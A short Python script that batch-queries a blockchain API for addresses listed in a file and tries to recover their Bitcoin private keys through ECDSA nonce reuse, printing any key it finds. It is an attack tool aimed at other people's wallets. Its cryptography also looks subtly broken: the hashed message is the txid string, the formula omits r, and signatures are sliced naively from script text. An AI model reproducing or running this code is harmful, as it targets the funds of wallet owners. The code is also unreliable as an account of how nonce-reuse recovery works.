import requests
import hashlib
import ecdsa
import os
import json

def get_transactions(bitcoin_address):
    url = f"https://sochain.com/api/v2/address/BTC/{bitcoin_address}"
    response = requests.get(url)
    data = response.json()
    return data.get('data', {}).get('txs', [])

def recover_private_key(bitcoin_address):
    transactions = get_transactions(bitcoin_address)
    signatures = {}
    for tx in transactions:
        for input in tx.get('inputs', []):
            signatures_list = input.get('script', '').split(" ")[1:-1]
            for signature in signatures_list:
                r_value = signature[:64]
                s_value = signature[64:128]
                z_value = hashlib.sha256(tx['txid'].encode()).hexdigest()
                if r_value in signatures:
                    s1, z1 = signatures[r_value]
                    s2, z2 = s_value, z_value
                    n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
                    r = int(r_value, 16)
                    s1 = int(s1, 16)
                    s2 = int(s2, 16)
                    z1 = int(z1, 16)
                    z2 = int(z2, 16)
                    private_key = ((z1 * s2 - z2 * s1) * ecdsa.invmod((s1 - s2), n)) % n
                    return private_key
                else:
                    signatures[r_value] = (s_value, z_value)

def process_addresses(file_path):
    with open(file_path, 'r') as file:
        addresses = file.read().splitlines()
    
    for address in addresses:
        private_key = recover_private_key(address)
        if private_key is not None:
            print(f"Private key for address {address}: {hex(private_key)}")
        else:
            print(f"No private key found for address {address}")

# Specify the file path relative to the script's directory
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'addys.txt')

# Then pass the file_path variable to the process_addresses function
process_addresses(file_path)